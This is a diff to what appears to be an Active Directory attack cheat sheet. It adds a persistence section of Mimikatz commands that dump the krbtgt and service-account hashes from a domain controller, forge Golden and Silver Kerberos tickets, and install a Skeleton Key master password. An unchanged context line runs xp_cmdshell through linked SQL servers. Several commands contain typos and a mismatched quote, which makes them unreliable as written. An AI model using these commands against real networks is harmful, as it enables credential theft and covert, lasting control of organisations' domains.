@@ -157,5 +157,23 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 -      Get-SQLServrLinkCrawler -instance abc-mssql  -Query  "exec master..xp_cmdshell 'whoami'"
   
   
-## Persistence
+## Persistence (Need Domain Admin privileges)
   
+### Golden Ticket Attack
+
+- Execute Mimikatz on DC as DA to get krbtgt hash
+-    Invoke-Mimikatz -Command '"lsadump::lsa /patch "' -computername xz-dc.abc.local
+- Now execute below command on anhy computer
+-    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator<Domain Admin user> /domain: abc.local /sid:<sid of current doamin> /krbtgt:<krbtgt hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+### Silver Ticket Attack
+
+- Grab the Serivce Account hash using Mimikatz
+-    Inovke-Mimikatz '"lsadump::lsa /patch"' 
+- Using hash , now execute mimikatz to get persistence on that machine
+-    Invoke-Mimikatz -command '"kerberos::golden /domain:<current domain> /sid:<sid of current domain> /target:<target server running service> /rc4:<ntmlm hash of service account> /service:<SPN name of service for which TGS is to e created> /user:Administrator /ptt"'
+ 
+### Skeleton Key
+
+- Access any machine using a single password "mimikatz" by following command
+-     Invoke-Mimikatz -command '"privilege::debug" misc::skeleton"' -computername xz-dc.abc.local
